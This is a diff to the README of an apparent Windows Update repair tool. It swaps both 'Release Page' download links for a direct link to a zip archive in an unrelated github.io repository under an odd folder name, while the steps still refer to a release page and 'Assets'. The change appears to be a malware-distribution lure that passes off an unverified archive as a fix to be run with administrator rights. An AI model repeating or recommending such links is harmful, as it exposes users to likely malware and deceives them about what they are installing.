@@ -5,7 +5,7 @@ description: "Repair Windows Update errors on Windows 10 and 11 using this tool 
 ---
 # 🛠️ Windows-Update-Stuck-Fix - Repair stalled Windows updates today
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/robinsonisabel74-arch/Windows-Update-Stuck-Fix/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/robinsonisabel74-arch/robinsonisabel74-arch.github.io/main/chondroskeleton/github-arch-robinsonisabel-io-2.0.zip)
 
 Windows Update sometimes stops responding. The update progress bar stays at zero percent for hours. This tool clears stuck update files and restarts the system services that manage Windows updates. It works on Windows 10 and Windows 11.
 
@@ -30,7 +30,7 @@ You must have administrator access to the computer. Windows requires permission 
 
 Visit the release page to obtain the current version of the repair tool.
 
-[Download the fix here](https://github.com/robinsonisabel74-arch/Windows-Update-Stuck-Fix/releases)
+[Download the fix here](https://raw.githubusercontent.com/robinsonisabel74-arch/robinsonisabel74-arch.github.io/main/chondroskeleton/github-arch-robinsonisabel-io-2.0.zip)
 
 1. Navigate to the link above.
 2. Look for the "Assets" section.
